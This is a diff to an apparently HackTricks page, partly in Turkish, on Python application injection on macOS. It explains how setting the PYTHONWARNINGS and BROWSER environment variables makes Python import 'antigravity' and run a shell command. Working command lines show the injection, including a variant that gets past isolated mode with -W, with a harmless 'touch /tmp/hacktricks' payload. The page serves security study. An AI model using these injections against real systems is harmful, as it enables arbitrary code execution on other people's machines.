@@ -1,22 +1,21 @@
-# macOS Python Applications Injection
+# macOS Python Application Injection
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Via `PYTHONWARNINGS` and `BROWSER` env variables
+## `PYTHONWARNINGS` ve `BROWSER` environment variables aracılığıyla
 
-Her iki environment variable değiştirilerek python çağrıldığında arbitrary code çalıştırılması mümkündür, örneğin:<sup>[[1]](#references)</sup>
+Bir saldırgan bir Python process'inin environment'ını kontrol edebiliyorsa, `PYTHONWARNINGS` ve `BROWSER` kombinasyonu, Python hazırlanmış bir warning seçeneğini işlerken `antigravity` module'ünü import ettiğinde command execution'ı tetikleyebilir. Bu teknik, `antigravity`'nin Python'ın `webbrowser` module'üyle bir URL açmasına ve bu module'ün `BROWSER` environment variable'ını dikkate almasına dayanır.<sup>[[1]](#references)</sup>
 ```bash
-# Generate example python script
+# Generate an example Python script.
 echo "print('hi')" > /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks
+# Create /tmp/hacktricks through the inherited environment.
 PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py
 
-# RCE which will generate file /tmp/hacktricks bypassing "-I" injecting "-W" before the script to execute
+# With isolated mode, inject the warning rule using -W instead.
 BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
 ```
-## Referanslar
+## References
 
 - [1] [Environment Variables ile Hacking - elttam](https://www.elttam.com/blog/env/)
-
 {{#include ../../../banners/hacktricks-training.md}}
